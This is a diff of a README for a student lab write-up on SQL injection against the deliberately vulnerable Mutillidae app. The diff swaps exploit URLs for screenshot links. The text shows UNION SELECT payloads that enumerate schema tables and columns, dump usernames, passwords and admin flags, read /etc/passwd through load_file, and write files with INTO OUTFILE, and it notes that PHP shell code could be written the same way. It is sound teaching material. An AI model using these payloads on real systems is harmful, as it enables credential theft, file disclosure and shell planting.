@@ -125,7 +125,8 @@ As given in the screenshot below columns 2,3,4 are usable in which we can substi
 
  Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=pavan%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
+![WhatsApp Image 2024-05-10 at 20 12 13_f5cc629f](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/d4d498ba-2687-4c4b-817f-7e46df5a757f)
+
 
 
 
@@ -137,7 +138,7 @@ Replace the query in the url with the following one:
 union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+![WhatsApp Image 2024-05-10 at 20 12 13_5c5ab4ab](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/2f1640db-4fb3-4e1e-91e2-0afe11b30acf)
 
 
 
@@ -158,8 +159,8 @@ Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
 
-http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=pavan%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details 
 
+![WhatsApp Image 2024-05-10 at 20 12 47_5fffdd69](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/b7114103-1e21-42a6-8aaf-1b03598b408f)
 
 
 
@@ -170,7 +171,7 @@ Once we discovered all available column names, we can extract information from t
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
+![WhatsApp Image 2024-05-10 at 20 15 38_8edb5b87](https://github.com/pavankishore-AIDS/sqlinjection/assets/94154941/bcdf89f9-6a28-49a4-beda-74941a31a3cf)
 
 
 
@@ -180,7 +181,7 @@ We can use the “LOAD_FILE()” operator to peruse the contents of any file con
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
-http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
+
 
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
 Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
